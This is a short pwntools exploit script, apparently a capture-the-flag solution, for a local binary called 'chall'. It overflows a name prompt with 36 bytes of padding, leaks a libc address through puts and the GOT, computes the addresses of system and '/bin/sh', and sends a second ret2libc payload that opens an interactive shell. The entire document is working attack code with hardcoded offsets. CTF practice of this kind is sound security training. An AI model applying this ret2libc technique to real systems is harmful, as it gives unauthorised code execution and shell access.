from pwn import *

io = process("./chall")
#io = remote("localhost",2222)

context.terminal = ['tmux','splitw','-h']

gdb.attach(io)
io.recvuntil("May I know your name?\n")


ebp = 0x804c038
puts_plt = 0x08049090
main = 0x080491fa
got = 0x804c010

payload = "a"*36 + p32(ebp) + p32(puts_plt) + p32(main) + p32(got)
io.sendline(payload)
io.recvline()

leak = u32(io.recv(4)) - 0x673d0
system = leak + 0x3cd80
binsh = leak + 0x17bb8f

log.info("libc @ "+str(hex(leak)))

payload = "a"*36 + p32(ebp) + p32(system) + p32(main) + p32(binsh)

io.recvuntil("May I know your name?\n")
io.sendline(payload)
io.interactive()
